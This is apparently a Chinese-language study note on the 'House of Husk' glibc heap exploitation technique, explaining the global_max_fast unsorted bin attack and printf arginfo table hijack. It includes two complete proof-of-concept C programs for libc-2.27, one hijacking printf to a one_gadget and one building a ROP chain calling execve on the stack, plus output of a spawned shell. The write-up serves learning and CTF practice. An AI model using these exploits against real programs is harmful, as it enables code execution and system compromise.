---
title: House of husk学习
tags:
  - binary
---

# House of husk

## 开箱即用

### Husk's method

条件：有 `printf` 系函数，并有格式化符。有可以制造 UAF 的条件。malloc 分配的大小没限制或几乎没限制。没开沙箱 ~~或者开了NX~~

使用：

1. leak libc
2. unsorted bin attack overwrite `global_max_fast`
3. overwrite `__printf_arginfo_table` and `__printf_arginfo_table`, write `one_gadget` into  `__printf_arginfo_table[?]`。
4. call `printf`

### Loona's method

条件：可以在栈上伪造 size 。有可以制造 UAF 的条件。malloc 分配的大小没限制或几乎没限制。

使用：

1. leak libc
2. unsorted bin attack overwrite `global_max_fast`
3. `free` overwrite `environ`，show `fd`。
4. correct `fd` to `fake_size`
5. double malloc, rop

## =======================分割线=======================

## Husk's method

### 知识列表

1. leak libc
2. unsorted bin attack
3. overwrite `global_max_fast`
4. the call chain of `printf`
5. overwrite `__printf_arginfo_table` and `__printf_arginfo_table`

### 原理

**3.**

`global_max_fast` 的默认值是 0x80，`fastbin` 中的 `chunk` 会被写入到 `main_arena` 的某个位置。但是如果 `global_max_fast` 很大，那么我们就可以通过 free 一个大 size 的 `chunk` ， 这样就可以对一个 `main_arena` 的高地址写入一个堆地址。

具体计算如下：

$$
malloc\_size = (addr\_to\_write-main\_arena\_addr)*2-16
$$

写成函数：

```python
def offset2size(addr):
  return (addr-MAIN_ARENA)*2-0x10
```

**4.**

```c
	if (__printf_function_table == NULL)
    {
      __printf_arginfo_table = (printf_arginfo_size_function **)
        calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
      if (__printf_arginfo_table == NULL)
        {
          result = -1;
          goto out;
        }
      __printf_function_table = (printf_function **)
        (__printf_arginfo_table + UCHAR_MAX + 1);
    }
```

上面是 [__register_printf_specifier](https://code.woboq.org/userspace/glibc/stdio-common/reg-printf.c.html#__register_printf_specifier) 函数的部分代码，当 `register_printf_specifier` 函数第一次调用时，会给 `__printf_arginfo_table `注册格式化输出函数，或者说赋初值。这个函数最终会在 `__parse_one_specmb` 中被调用。

同理， `__printf_function_table` 函数如果被注册，也会最终在 `printf_positional` 被调用。

**5.**

如果一个 `printf` 函数是这么输出的：

```c
printf("%s",str);
```

那么我们需要在伪造的堆块上这么构造：

`chunk + ('X' - 2) * 8 = exploit_function`

只要这个 `printf` 被调用，就会触发 `exploit_function` 。

### POC

根据POC来分析一下 `house_of_husk` 的利用过程。

```c
/**
 * Husk's method - House of Husk
 * This PoC is supposed to be run with libc-2.27
 */
#include <stdio.h>
#include <stdlib.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a45c

int main (void)
{
  unsigned long libc_base;
  char *a[10];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL); // make printf quiet

  /* leak libc */
  a[0] = malloc(0x500); /* UAF chunk */
  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
  a[3] = malloc(0x500); /* avoid consolidation */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lx\n", libc_base);

  /* prepare fake printf arginfo table */
  *(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;

  /* unsorted bin attack */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* overwrite global_max_fast */

  /* overwrite __printf_arginfo_table */
  free(a[1]);
  free(a[2]);

  /* ignite! */
  getchar();
  printf("%X", 0);
  
  return 0;
}
```

第一部分是 `unsorted bin attack` 打到`global_max_fast`，单独截出来 没什么好说的。

```c
a[0] = malloc(0x500);
free(a[0]);
*(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
a[0] = malloc(0x500); /* overwrite global_max_fast */
```

下面这部分是改掉`global_max_fast`之后用于覆盖`__printf_arginfo_table`和`__printf_function_table`的。

```c
a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
free(a[1]);
free(a[2]);
```

然后将伪造的堆块"X"位置改为对应的 exploit 即可。

```c
*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
getchar();
printf("%X", 0);
```

效果：

```sh
┌─[surager@ubuntu] - [~/machome/ctftools/poc] - [Fri Dec 11, 22:56]
└─[$] <> ./house_of_husk
libc @ 0x7f21445d9000

$ whoami
surager
```

### 问题

1.开了沙箱之后明显不知道如何控制程序流进行 orw。

这个可能可以通过 [pcop](https://link.springer.com/article/10.1007/s11416-017-0299-1) 技术进行解决，但是还是没有找到能够控制参数的 gadget。也可以通过下一种方法解决。

2.需要 UAF 的堆块，而一般的题目不会给出直接的 UAF。

针对 off-by-null 等能够造成堆块重叠的漏洞可以使用 house of husk。

3.size 没算准。

建议枪毙。

## Loona's method

这种方法能够在没有 `printf` 和开了沙箱的情况下进行 ROP 攻击。代价是要能在栈上伪造size。

### POC

```c
/**
 * Loona's method - House of Husk
 * This PoC is supposed to be run with libc-2.27.
 */
#include <stdio.h>
#include <stdlib.h>
#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define ENVIRON          0x3ee098
#define LIBC_BINSH       0x00000000001b40fa
#define LIBC_POP_RDI     0x2155f
#define LIBC_POP_RSI     0x0000000000023e8a
#define LIBC_POP_RDX     0x1b96
#define LIBC_EXECVE      0xe4e90
unsigned long libc_base, addr_env, ofs_fake;
char *a[10];
int i;
int main (int argc, char **argv, char **envp)
{
  unsigned long fake_size;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL); // make printf quiet
  ofs_fake = (void*)envp - (void*)&fake_size; /* this is fixed */
  /* leak libc */
  a[0] = malloc(0x500); /* UAF chunk */
  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
  a[2] = malloc(0x500); /* avoid consolidation */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lx\n", libc_base);
  /* unsorted bin attack */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* overwrite global_max_fast */
  /* leak environ */
  free(a[1]);
  addr_env = *(unsigned long*)a[1];
  printf("environ = 0x%lx\n", addr_env);
  *(unsigned long*)a[1] = addr_env - ofs_fake - 8;
  /* prepare fake size on stack*/
  fake_size = (offset2size(ENVIRON - MAIN_ARENA) + 0x10) | 1;
  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
  /* overwrite return address */
  a[3] = malloc(offset2size(ENVIRON - MAIN_ARENA));
  for(i = 0; i < 0x20; i++) {
    *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI + 1; /* ret sled */
  }
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDX; i++;
  *(unsigned long*)(a[3] + i*8) = 0; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RSI; i++;
  *(unsigned long*)(a[3] + i*8) = 0; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_BINSH; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_EXECVE; i++;
  getchar();
  return 0;
}
```

和 Husk's method 差不多，先对 `global_max_fast` 攻击。然后覆盖到 `environ` 。

```c
{
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lx\n", libc_base);
  /* unsorted bin attack */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* overwrite global_max_fast */
  /* leak environ */
  free(a[1]);
  addr_env = *(unsigned long*)a[1];
  printf("environ = 0x%lx\n", addr_env);
}
```

之后覆盖这个堆块的 fd 为 `fake_size - 8` ，这样进行两次 malloc 之后，我们便将堆块分配到了栈上，拿到了一个栈上的堆块。

```sh
pwndbg> p a[3]
$1 = 0x7fffffffe330 "\300\t@"
```

## 问题

所有 POC 均在 libc2.27 的环境下进行，所以 unsorted bin attack 还好使。

如果进入 libc2.31 环境中，本方法还需要优化。

## 参考链接

House of Husk [https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507)

house-of-husk学习笔记 [https://www.anquanke.com/post/id/202387](https://www.anquanke.com/post/id/202387)

